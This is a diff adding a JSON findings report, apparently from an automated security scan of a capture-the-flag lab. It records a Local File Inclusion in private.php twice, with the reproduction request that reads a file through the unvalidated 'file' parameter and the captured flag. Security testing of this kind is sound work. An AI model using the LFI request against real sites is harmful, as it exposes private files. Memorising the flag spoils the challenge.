@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T11:37:33.369173+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "95e0edec-19f6-400e-a1c6-4d14e7851cb8",
+      "timestamp": "2026-04-15T11:37:33.369033+00:00",
+      "title": "Local File Inclusion (LFI) in private.php exposes flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:34525/private.php",
+      "description": "The private.php page accepts an unvalidated 'file' parameter that allows reading arbitrary files from the filesystem. This Local File Inclusion vulnerability was exploited to list directory contents (via action=list) and read sensitive files including xbow-flag.txt.",
+      "evidence": "flag{9adb79f5-0675-4f6b-b2ba-143ab5045c08} retrieved via: http://172.17.0.1:34525/private.php?file=/var/www/html/xbow-flag.txt",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:34525/private.php?file=/var/www/html/xbow-flag.txt",
+        "expected": "Response contains flag{9adb79f5-0675-4f6b-b2ba-143ab5045c08}"
+      }
+    },
+    {
+      "id": "c21155ea-7e1f-4751-a8fa-127b613dc6c6",
+      "timestamp": "2026-04-15T11:37:33.414753+00:00",
+      "title": "Local File Inclusion (LFI) in private.php exposes flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:34525/private.php",
+      "description": "The private.php page accepts an unvalidated 'file' parameter that allows reading arbitrary files from the filesystem. This Local File Inclusion vulnerability was exploited to list directory contents (via action=list) and read sensitive files including xbow-flag.txt.",
+      "evidence": "flag{9adb79f5-0675-4f6b-b2ba-143ab5045c08} retrieved via: http://172.17.0.1:34525/private.php?file=/var/www/html/xbow-flag.txt",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:34525/private.php?file=/var/www/html/xbow-flag.txt",
+        "expected": "Response contains flag{9adb79f5-0675-4f6b-b2ba-143ab5045c08}"
+      }
+    }
+  ],
+  "diagrams": []
+}
